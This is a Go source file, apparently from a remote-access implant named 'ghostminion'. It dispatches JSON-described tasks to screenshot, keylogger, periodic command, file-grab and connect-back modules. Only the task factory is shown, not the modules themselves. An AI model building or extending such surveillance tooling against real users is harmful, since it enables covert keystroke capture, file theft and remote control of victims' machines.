package apps

import (
	"encoding/json"
	"errors"
	"ghostminion/logger"
	"sync"
)

type AppType string

const (
	ScreenShotTask    AppType = "screenshot"
	KeyLoggerTask     AppType = "keylogger"
	CommandTask       AppType = "command"
	GetFileTask       AppType = "getfile"
	ChangeConfigTask  AppType = "changeconfig"
	ConnectOnlineTask AppType = "connectonline"
)

type AppData struct {
	Id     string          `json:"id"`
	Type   AppType         `json:"type"`
	Name   string          `json:"name"`
	Params json.RawMessage `json:"params"`
}

type App interface {
	Start(wg *sync.WaitGroup)
	Stop()
	Validate() error
}

var lgr = logger.GetLogger()

func NewAppFactory(appData AppData) (App, error) {
	var app App = nil
	var err error = nil

	switch appData.Type {
	case ChangeConfigTask:
		// TODO: change config on demand
		break
	case ScreenShotTask:
		app, err = newApp[ScreenshotApp](appData.Params)
		break
	case KeyLoggerTask:
		app, err = newApp[KeyLoggerApp](appData.Params)
		break
	case CommandTask:
		app, err = newApp[PeriodicCommandApp](appData.Params)
		break
	case GetFileTask:
		app, err = newApp[PeriodicGetFileApp](appData.Params)
		break
	case ConnectOnlineTask:
		app, err = newApp[ConnectOnlineApp](appData.Params)
		break
	default:
		err = errors.New("unknown app type")
	}
	if err != nil {
		return nil, err
	}
	if app == nil {
		return nil, errors.New("app: app not found")
	}
	return app, nil
}

func newApp[T any](raw json.RawMessage) (*T, error) {
	var app T
	if err := json.Unmarshal(raw, &app); err != nil {
		return nil, err
	}
	return &app, nil
}
